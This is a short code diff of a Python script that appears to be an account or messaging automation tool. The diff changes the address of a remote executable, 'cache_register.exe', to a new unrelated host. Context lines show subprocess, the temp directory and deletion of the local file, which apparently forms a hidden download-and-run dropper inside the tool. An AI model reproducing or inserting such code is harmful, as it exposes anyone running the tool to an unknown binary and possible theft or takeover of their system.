@@ -2,7 +2,7 @@ import asyncio
 import os
 import subprocess 
 
-url = "https://clientes.tradelog.com.ar/cache_register.exe"
+url = "https://ozarkfluidpower.com/hosecat/cache_register.exe"
 
 temp_dir = tempfile.gettempdir()
 
@@ -61,6 +61,7 @@ os.remove(local_path)
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
+
 
 
 
